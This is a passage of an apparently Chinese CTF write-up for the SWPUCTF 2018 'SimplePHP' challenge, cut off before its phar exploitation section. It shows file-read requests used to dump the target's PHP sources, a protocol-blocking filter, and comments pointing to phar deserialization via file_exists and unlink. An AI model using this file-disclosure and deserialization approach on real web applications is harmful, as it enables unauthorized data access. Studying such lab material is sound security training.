    <content type="html"><![CDATA[<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><h2 id="查看upload-file-php的前端代码"><a href="#查看upload-file-php的前端代码" class="headerlink" title="查看upload_file.php的前端代码:"></a>查看upload_file.php的前端代码:</h2><p><img src="/images/2024-2-3-SimplePHP/image-20240131153511696.png" alt="image-20240131153511696"></p><p>可以知道flag在flag.php文件中</p><p><img src="/images/2024-2-3-SimplePHP/image-20240131153704971.png" alt="image-20240131153704971"></p><p>同时发现file.php存在文件内容读取点file,猜测可以利用该文件读取点读取一些文件信息:</p><h2 id="读取文件信息"><a href="#读取文件信息" class="headerlink" title="读取文件信息:"></a>读取文件信息:</h2><h3 id="读取index-php文件信息"><a href="#读取index-php文件信息" class="headerlink" title="读取index.php文件信息:"></a>读取index.php文件信息:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">file.php?file=index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131153846994.png" alt="image-20240131153846994"></p><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>发现存在一个base.php</p><h3 id="读取upload-file-php"><a href="#读取upload-file-php" class="headerlink" title="读取upload_file.php:"></a>读取upload_file.php:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">file.php?file=upload_file.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131154022816.png" alt="image-20240131154022816"></p><h4 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload_file.php:"></a>upload_file.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">upload_file</span>(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;html&gt; <br>&lt;head&gt; <br>&lt;meta charest=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>&lt;title&gt;文件上传&lt;/title&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>&lt;div align = <span class="hljs-string">&quot;center&quot;</span>&gt; <br>        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; <br>&lt;/div&gt; <br>&lt;style&gt; <br>    p&#123; margin:<span class="hljs-number">0</span> auto&#125; <br>&lt;/style&gt; <br>&lt;div&gt; <br>&lt;form action=<span class="hljs-string">&quot;upload_file.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt; <br>    &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;文件名:&lt;/label&gt; <br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span>&gt;&lt;br&gt; <br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;提交&quot;</span>&gt; <br>&lt;/div&gt; <br><br>&lt;/script&gt; <br>&lt;/body&gt; <br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现存在function.php</p><h3 id="读取file-php"><a href="#读取file-php" class="headerlink" title="读取file.php:"></a>读取file.php:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">file.php?file=file.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-SimplePHP/image-20240131154240387.png" alt="image-20240131154240387"></p><h4 id="file-php"><a href="#file-php" class="headerlink" title="file.php:"></a>file.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-comment">// 指定当前程序PHP只能访问位于 /var/www/html/ 目录及其子目录下的文件。如果脚本尝试访问超出这个目录范围的文件，将会受到限制并抛出相应的错误或异常</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-comment">// 获取文件名信息</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-comment">// 判断文件名是否为空</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-comment">// 申请一个show类</span><br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-comment">// 判断文件是否存在，可以用于触发phar反序列化</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-comment">// 展示文件信息</span><br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="读取class-php"><a href="#读取class-php" class="headerlink" title="读取class.php:"></a>读取class.php:</h3><h4 id="class-php"><a href="#class-php" class="headerlink" title="class.php:"></a>class.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="读取function-php"><a href="#读取function-php" class="headerlink" title="读取function.php:"></a>读取function.php:</h3><h4 id="function-php"><a href="#function-php" class="headerlink" title="function.php:"></a>function.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-comment">// 设置filename为上传的文件名与$_SERVER[&quot;REMOTE_ADDR&quot;]拼接后的字符串的md5加密字符串</span><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-comment">// 判断upload/文件夹下是否存在该文件</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-comment">// 如果存在同文件名的文件，则将其删除，unlink可以触发phar反序列化</span><br>        <span class="hljs-comment">// 但是由于当前php程序没有引用class.php类，所以无法使用phar发序列化触发pop链</span><br>        <span class="hljs-comment">// 但如果该类被引用，引用的php文件中同样引用了class.php,则可以使用phar反序列化</span><br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-comment">// 将文件内容转移到新的文件夹upload下</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-comment">// 输出文件上传成功的信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-comment">// 先进行对文件的检查</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123; <br>        <span class="hljs-comment">// 文件为白名单文件时，将文件上传</span><br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    &#125; <br>&#125; <br><span class="hljs-comment">// 对上传文件进行检测</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-comment">// 设置白名单文件后缀名，phar反序列化可以进行绕过</span><br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-comment">// 将文件名按&#x27;.&#x27;分割成各个数组</span><br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-comment">// 获取$temp数组的最后一个元素</span><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-comment">// 判断我们上传的文件后缀名在不在白名单中</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="读取base-php"><a href="#读取base-php" class="headerlink" title="读取base.php:"></a>读取base.php:</h3><h4 id="base-php"><a href="#base-php" class="headerlink" title="base.php:"></a>base.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-meta">?&gt;</span> <br>&lt;!DOCTYPE html&gt; <br>&lt;html&gt; <br>&lt;head&gt; <br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt; <br>    &lt;title&gt;web3&lt;/title&gt; <br>    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt; <br>    &lt;script src=<span class="hljs-string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt; <br>&lt;/head&gt; <br>&lt;body&gt; <br>    &lt;nav <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">navbar</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">default</span>&quot; <span class="hljs-title">role</span>=&quot;<span class="hljs-title">navigation</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>-<span class="hljs-title">fluid</span>&quot;&gt; </span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">header</span>&quot;&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">a</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">navbar</span>-<span class="hljs-title">brand</span>&quot; <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;首页&lt;/<span class="hljs-title">a</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbra</span>-<span class="hljs-title">toggle</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">file</span>.<span class="hljs-title">php</span>?<span class="hljs-title">file</span>=&quot;&gt;查看文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">upload_file</span>.<span class="hljs-title">php</span>&quot;&gt;上传文件&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">            &lt;<span class="hljs-title">ul</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">nav</span> <span class="hljs-title">navbar</span>-<span class="hljs-title">right</span>&quot;&gt; </span><br><span class="hljs-class">                &lt;<span class="hljs-title">li</span>&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">index</span>.<span class="hljs-title">php</span>&quot;&gt;&lt;<span class="hljs-title">span</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">glyphicon</span> <span class="hljs-title">glyphicon</span>-<span class="hljs-title">user</span>&quot;&gt;&lt;/<span class="hljs-title">span</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SERVER</span>[&#x27;<span class="hljs-title">REMOTE_ADDR</span>&#x27;];?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt; </span><br><span class="hljs-class">            &lt;/<span class="hljs-title">ul</span>&gt; </span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt; </span><br><span class="hljs-class">    &lt;/<span class="hljs-title">nav</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt; </span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt; </span><br><span class="hljs-class">&lt;!--<span class="hljs-title">flag</span> <span class="hljs-title">is</span> <span class="hljs-title">in</span> <span class="hljs-title">f1ag</span>.<span class="hljs-title">php</span>--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="读取f1ag-php"><a href="#读取f1ag-php" class="headerlink" title="读取f1ag.php:"></a>读取f1ag.php:</h3><p><img src="/images/2024-2-3-SimplePHP/image-20240131162701502.png" alt="image-20240131162701502"></p><p>无法直接访问f1ag.php文件</p><h3 id="代码审计分析"><a href="#代码审计分析" class="headerlink" title="代码审计分析:"></a>代码审计分析:</h3><p><img src="/images/2024-2-3-SimplePHP/image-20240131165556845.png" alt="image-20240131165556845"></p><p>可以通过直接绕过preg_math()的检测获取f1ag.php的内容</p><p><img src="/images/2024-2-3-SimplePHP/image-20240131165726408.png" alt="image-20240131165726408"></p><p>file.php中存在file_exists()函数，我们也可以通过该函数触发phar反序列化，获取f1ag.php的内容</p><p>这里我们尝试使用phar反序列化获取f1ag.php文件的内容</p><h4 id="危险函数"><a href="#危险函数" 